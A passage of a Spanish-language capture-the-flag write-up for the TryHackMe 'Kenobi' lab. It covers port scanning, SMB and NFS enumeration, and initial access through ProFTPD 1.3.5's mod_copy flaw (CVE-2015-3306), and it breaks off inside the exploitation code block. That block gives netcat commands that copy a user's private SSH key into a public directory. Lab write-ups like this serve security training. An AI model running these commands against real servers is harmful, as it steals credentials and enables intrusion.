# TryHackMe: Kenobi

**Dificultad:** Fácil 
**Sistema Operativo:** Linux (Ubuntu)
**Herramientas usadas:** Nmap, smbclient, Netcat, NFS, SSH, Metasploit.

## 1. Reconocimiento (Recon)
Se realizó un escaneo de puertos con Nmap (`nmap -sV -sC -T4 <IP>`).
**Puertos abiertos:**
- 21 (FTP - ProFTPD 1.3.5)
- 22 (SSH)
- 80 (HTTP)
- 111 (rpcbind)
- 139/445 (SMB)
- 2049 (NFS)

## 2. Enumeración
*   **SMB:** Se enumeraron los recursos compartidos con `smbclient -L //<IP>/`, encontrando el recurso `anonymous` accesible sin credenciales.
*   **NFS:** Usando `showmount -e <IP>`, se descubrió que el servidor exportaba el directorio `/var`.
*   **Web:** Revisando `/admin.html` se obtuvo una pista sobre el usuario `kenobi`.

## 3. Acceso Inicial (Explotación)
El servidor FTP corría la versión ProFTPD 1.3.5, vulnerable a **CVE-2015-3306** (mod_copy). 
Se usó Netcat para abusar de los comandos `SITE CPFR` y `SITE CPTO` y así copiar la llave privada SSH del usuario `kenobi` a la carpeta pública `/var/tmp/`.

```bash
nc <IP> 21
USER anonymous
PASS test@test.com
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
